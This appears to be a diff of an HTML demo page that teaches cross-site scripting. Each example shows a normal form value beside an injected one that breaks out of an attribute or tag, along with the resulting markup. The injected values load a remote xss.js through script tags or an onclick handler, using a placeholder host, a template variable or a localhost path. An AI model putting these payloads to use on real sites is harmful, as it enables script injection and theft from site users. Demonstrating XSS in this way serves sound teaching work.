@@ -7,92 +7,79 @@
         <ul>
             <li>
                 <div class="instead-of">User name: <input value="Eugene" readonly="readonly" /></div>
-                <div class="inject">User name: <input value="&lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;" readonly="readonly" /></div>
-                <div></div>
-                <div class="instead-of">
-                    &lt;html&gt;
+                <div class="inject">User name: <input value="&lt;script src=&quot;{{xss_js}}&quot;&gt;&lt;/script&gt;" readonly="readonly" /></div>
+                <div class="clear"></div>
+                <div class="instead-of html">
                     <br/>...<br/>
                     User name: &lt;span&gt;<strong>Eugene</strong>&lt;/span&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
-                <div class="inject">
-                    &lt;html&gt;
+                <div class="inject html">
                     <br/>...<br/>
-                    User name: &lt;span&gt;<strong>&lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;</strong>&lt;/span&gt;
+                    User name: &lt;span&gt;<strong>&lt;script src=&quot;{{xss_js}}&quot;&gt;&lt;/script&gt;</strong>&lt;/span&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
-                <div></div>
+                <div class="clear"></div>
+                <div class="arrow"></div>
             </li>
             <li>
                 <div class="instead-of">Country: <input value="UK" readonly="readonly" /></div>
                 <div class="inject">Country: <input value="
-&quot; onclick=&quot;{d=document;s=d.createElement('script');s.setAttribute('src','http://xssfail.com/xss.js');d.body.appendChild(s)}&quot; x=&quot;" readonly="readonly" /></div>
+&quot; onclick=&quot;{d=document;s=d.createElement('script');s.setAttribute('src','{{xss_js}}');d.body.appendChild(s)}return false" readonly="readonly" /></div>
                 <div class="clear"></div>
-                <div class="instead-of">
-                    &lt;html&gt;
+                <div class="instead-of html">
                     <br/>...<br/>
                     &lt;a href=&quot;http://whocares.com?country=<strong>UK</strong>&quot;&gt;Selected country&lt;/a&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
-                <div class="inject">
-                    &lt;html&gt;
+                <div class="inject html">
                     <br/>...<br/>
                     &lt;a href=&quot;http://whocares.com?country=<strong>&quot;
-                    onclick=&quot;{d=document;s=d.createElement('script');s.setAttribute('src','http://xssfail.com/xss.js');d.body.appendChild(s)}&quot;
-                    x=&quot;</strong>&quot;&gt;Selected country&lt;/a&gt;
+                    onclick=&quot;{d=document;s=d.createElement('script');s.setAttribute('src','{{xss_js}}');d.body.appendChild(s)}return false</strong>&quot;&gt;Selected country&lt;/a&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
                 <div class="clear"></div>
+                <div class="arrow"></div>
             </li>
             <li>
                 <div class="instead-of">Country: <input value="UK" readonly="readonly" /></div>
                 <div class="inject">Country: <input value="
-&quot;&gt;&lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;&lt;a&gt;" readonly="readonly" /></div>
+&quot;&gt;&lt;/a&gt; &lt;script src=&quot;http://localhost:5984/xss/_design/api/_rewrite/xss.js&quot;&gt;&lt;/script&gt; &lt;a href=&quot;" readonly="readonly" /></div>
                 <div class="clear"></div>
-                <div class="instead-of">
-                    &lt;html&gt;
+                <div class="instead-of html">
                     <br/>...<br/>
                     &lt;a href=&quot;http://whocares.com?country=<strong>UK</strong>&quot;&gt;Selected country&lt;/a&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
-                <div class="inject">
-                    &lt;html&gt;
+                <div class="inject html">
                     <br/>...<br/>
                     &lt;a href=&quot;http://whocares.com?country=<strong>&quot;&gt;&lt;/a&gt;
-                    &lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;
+                    &lt;script src=&quot;{{xss_js}}&quot;&gt;&lt;/script&gt;
                     &lt;a href=&quot;</strong>&quot;&gt;&lt;/a&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
                 <div class="clear"></div>
+                <div class="arrow"></div>
             </li>
             <li>
                 <div class="instead-of">Preffered color: <input value="red" readonly="readonly" /></div>
                 <div class="inject">Preffered color: <input value="
-&quot; /&gt;&lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;&lt;img src=&quot;" readonly="readonly" /></div>
+&quot; /&gt;&lt;script src=&quot;{{xss_js}}&quot;&gt;&lt;/script&gt;&lt;img src=&quot;" readonly="readonly" /></div>
                 <div class="clear"></div>
-                <div class="instead-of">
-                    &lt;html&gt;
+                <div class="instead-of html">
                     <br/>...<br/>
-                    &lt;img src=&quot;http://whocares.com/get-image/color=<strong>red</strong>&quot; /&gt;
+                    &lt;img src=&quot;http://whocares.com/get-image?color=<strong>red</strong>&quot; /&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
-                <div class="inject">
-                    &lt;html&gt;
+                <div class="inject html">
                     <br/>...<br/>
-                    &lt;img src=&quot;http://whocares.com/get-image/color=<strong>&quot; /&gt;
-                    &lt;script src=&quot;http://xssfail.com/xss.js&quot;&gt;&lt;/script&gt;
+                    &lt;img src=&quot;http://whocares.com/get-image?color=<strong>&quot; /&gt;
+                    &lt;script src=&quot;{{xss_js}}&quot;&gt;&lt;/script&gt;
                     &lt;img src=&quot;</strong>&quot; /&gt;
                     <br/>...<br/>
-                    &lt;/html&gt;
                 </div>
                 <div class="clear"></div>
+                <div class="arrow"></div>
             </li>
         </ul>
     </body>
